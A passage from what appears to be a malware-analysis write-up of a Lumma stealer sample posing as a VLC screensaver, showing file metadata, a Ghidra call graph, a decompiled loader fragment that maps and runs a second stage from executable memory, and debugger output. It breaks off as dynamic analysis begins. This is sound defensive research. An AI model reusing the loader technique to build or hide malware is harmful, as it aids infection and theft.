&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ exiftool sample.scr
ExifTool Version Number         : 13.00
File Name                       : sample.scr
Directory                       : .
File Size                       : 889 MB
File Modification Date/Time     : 2025:07:15 11:58:55-04:00
File Access Date/Time           : 2025:07:15 11:59:03-04:00
File Inode Change Date/Time     : 2025:07:15 11:58:55-04:00
File Permissions                : -rwxr-xr-x
File Type                       : Win32 EXE
File Type Extension             : exe
MIME Type                       : application/octet-stream
Machine Type                    : Intel 386 or later, and compatibles
Time Stamp                      : 2025:06:28 08:44:47-04:00
Image File Characteristics      : Executable, 32-bit
PE Type                         : PE32
Linker Version                  : 14.44
Code Size                       : 218112
Initialized Data Size           : 49726464
Uninitialized Data Size         : 0
Entry Point                     : 0x34360
OS Version                      : 6.0
Image Version                   : 0.0
Subsystem Version               : 6.0
Subsystem                       : Windows GUI
File Version Number             : 5.21.180.7087
Product Version Number          : 5.21.180.7087
File Flags Mask                 : 0x0000
File Flags                      : (none)
File OS                         : Win32
Object File Type                : Executable application
File Subtype                    : 0
Language Code                   : English (U.S.)
Character Set                   : Unicode
Company Name                    : PersistentProfile Engineering
File Description                : Integrates deployed Namespace modules
File Version                    : 5.21.180.7087
Product Version                 : 5.21.11
Product Name                    : ZephyrAnswerwave
Legal Copyright                 : \u00A9 2025 PersistentProfile Engineering
Legal Trademarks                : TM ZephyrAnswerwave
Internal Name                   : Luminoslightlink:Flashlink
Original File Name              : Luminoslightlink:Flashlink.exe
Comments                        : layer integrator opened at server
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The last set of items are interesting because they don’t match the type of file that this executable was spoofing. The “ZephyrAnswerwave” and “Luminoslightlink:Flashlink” strings were leads I chose not to pursue. My guess is that it is designed to look like a legitimate application; it also makes me wonder if, at some point, this was distributed as a fake torrent of those applications as well.&lt;/p&gt;

&lt;p&gt;As another note, the “File Description” value will appear as the task’s name in task manager if you’re running Windows 10. The icon, however, is still the VLC logo.&lt;/p&gt;

&lt;p&gt;Let’s start static analysis by opening the project in Ghidra. The executable has a ton of loops and a ton of register- and stack-based calls. While register calls like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CALL EAX&lt;/code&gt; signify the use of function pointers, the stack-based calls like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CALL DWORD PTR [ESP+8]&lt;/code&gt; stand out as a bit suspicious.&lt;/p&gt;

&lt;p&gt;In addition, I noticed a generous amount of suspicious Windows library functions, but the function in which they live has no code path from the PE’s entrypoint. I marked this as a possible obfuscation technique.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/2025-07-17/lumma-sus-functions.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;To help me analyze the sample, I wrote a &lt;a href=&quot;https://gist.github.com/halcyondream/8917aad011851090085e47a966bb34e9&quot;&gt;small Ghidra script&lt;/a&gt; that generates a call graph starting from the entrypoint. It’s simple and gives pretty rudimentary output:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;callgraph.py&amp;gt; Running...
Call graph starting from program entrypoint
entry  { @ 0xNone }
  FUN_00001cd0  { @ 0x00034377 }
  ...
  FUN_00034950  { @ 0x000344f2 }
    FUN_00034ae0  { @ 0x000349e8 }
    FUN_00034ae0  { @ 0x00034a66 }
    CALL EBP  { @ 0x00034a7d }
    CALL EDI  { @ 0x00034a86 }
    CALL EBP  { @ 0x00034a88 }
    FreeLibrary  { @ 0x00034a8f }
  ...
  FUN_00001a50  { @ 0x00034595 }
    FUN_00034ae0  { @ 0x00001ae5 }
    CALL ESI  { @ 0x00001b0e }
    CALL ESI  { @ 0x00001b1f }
    CALL ESI  { @ 0x00001b2e }
    FUN_00036030  { @ 0x00001c7e }
      FUN_00035fd0  { @ 0x000360a0 }
      FUN_00035fd0  { @ 0x00036360 }
    FUN_000018a0  { @ 0x00001ca3 }
      VirtualAlloc  { @ 0x000018c5 }
      VirtualAlloc  { @ 0x000018d8 }
      FUN_00001880  { @ 0x000018e1 }
      FUN_00001880  { @ 0x00001913 }
      LoadLibraryA  { @ 0x0000195a }
      CALL dword ptr [ESP + 0x20]  { @ 0x0000198a }
      CALL EAX  { @ 0x00001a2c }
      VirtualFree  { @ 0x00001a36 }
callgraph.py&amp;gt; Finished!
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The script confirmed that there wasn’t a known code path leading to the function with all of those suspicious imports. Most of the calls were to internal functions. The final function called by the entrypoint’s code contained a code path to Windows memory allocators and library loaders, so I decided to start the bulk of my analysis there.&lt;/p&gt;

&lt;p&gt;Here’s a snippet of the Ghidra decompilation:&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__fastcall&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;FUN_000018a0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;param_1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;lpAddress&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;VirtualAlloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LPVOID&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;iVar7&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x34&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SIZE_T&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;iVar7&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x50&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x3000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x40&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lpAddress&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LPVOID&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;lpAddress&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;VirtualAlloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LPVOID&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SIZE_T&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;iVar7&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x50&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x3000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x40&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;iVar10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;iVar2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;iVar10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lpAddress&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;piVar5&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;iVar10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lpAddress&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;iVar2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;hModule&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LoadLibraryA&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LPCSTR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;piVar5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lpAddress&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hModule&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HMODULE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;puVar11&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;undefined4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;piVar5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lpAddress&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;iVar10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;piVar5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;piVar5&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lpAddress&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;iVar10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;piVar5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;puVar9&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uint&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;iVar10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lpAddress&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;uVar6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;puVar9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uVar6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
          &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uVar6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;lpProcName&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LPCSTR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uVar6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xffff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
          &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
          &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;lpProcName&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LPCSTR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uVar6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lpAddress&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
          &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;pFVar3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;GetProcAddress&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hModule&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lpProcName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;puVar9&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;puVar9&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
          &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;puVar11&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pFVar3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;puVar11&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;puVar11&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;uVar6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;puVar9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;iVar2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;piVar5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;piVar5&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;piVar5&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;code&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;iVar7&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x28&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lpAddress&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))();&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;VirtualFree&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lpAddress&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x8000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;You’ll notice the use of some kernel functions. Here’s how they operate in this context:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;VirtualAlloc&lt;/code&gt; allocates a buffer of size 0x5d000. Don’t ask me why it’s always that value or if there’s another path to change the size.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LoadLibraryA&lt;/code&gt; will loop through a list of kernel DLLs and load them.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetProcAddress&lt;/code&gt; will loop through the loaded libraries and store the addresses of some functions that we will see in a bit.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;VirtualFree&lt;/code&gt; will free the buffer created at the beginning of the function.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;With that out of the way, the goofy-looking function-pointer call, our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CALL EAX&lt;/code&gt; instruction from the graph, may make a little more sense. It’s calling some code offset within the memory buffer.&lt;/p&gt;

&lt;p&gt;In sum, the buffer is storing a second stage, and that call will execute it. This is hard to appreciate in static analysis, but the debugger reveals it.&lt;/p&gt;

&lt;p&gt;After looking at the hexdump, I noticed that the majority of the file is just null bytes, which split the file into two parts. The PE file exists in the first part.&lt;/p&gt;

&lt;p&gt;The second part contains some certificates and other junk data. These are perhaps used in cryptographic operations when communicating with the C2 server, but they didn’t really come up in dynamic analysis.&lt;/p&gt;

&lt;p&gt;I split the first part from the first byte to offset &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x2fa1bd0&lt;/code&gt;. This resulted in a hash of:&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;8075916cd322593aa54f0bae87a3ff306162f71922da2872dbef0675fedc3e9f
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The filesize is only 47.3 MB, which did scan in Virus Total.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/2025-07-17/lumma-vt-slice1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;You can see that a couple of vendors rightly flag it as Lumma. However, the behaviors are a bit unclear so far.&lt;/p&gt;

&lt;p&gt;Let’s check it out in an isolated lab. The image loads as “Project3” in the debugger:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0:000&amp;gt; lm
start    end        module name
00ca0000 03c46000   Project3   (no symbols)
...

0:000&amp;gt; lm Dvm Project3
Browse full module list
start    end        module name
00ca0000 03c46000   Project3   (no symbols)           
    Loaded symbol image file: C:\sample.scr
    Image path: Project3.exe
    Image name: Project3.exe
    Browse all global symbols  functions  data  Symbol Reload
    Timestamp:        Sat Jun 28 05:44:47 2025 (685FE3BF)
    CheckSum:         34FA890A
    ImageSize:        02FA6000
    File version:     5.21.180.7087
    Product version:  5.21.180.7087
    File flags:       0 (Mask 0)
    File OS:          4 Unknown Win32
    File type:        1.0 App
    File date:        00000000.00000000
    Translations:     0409.04b0
    Information from resource tables:
        CompanyName:      PersistentProfile Engineering
        ProductName:      ZephyrAnswerwave
        InternalName:     Luminoslightlink:Flashlink
        OriginalFilename: Luminoslightlink:Flashlink.exe
        ProductVersion:   5.21.11
        FileVersion:      5.21.180.7087
        FileDescription:  Integrates deployed Namespace modules
        LegalCopyright:   \u00A9 2025 PersistentProfile Engineering
        LegalTrademarks:  TM ZephyrAnswerwave
        Comments:         layer integrator opened at server
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Start by breaking on the CALL EAX offset and tracing one step:&lt;/p&gt;

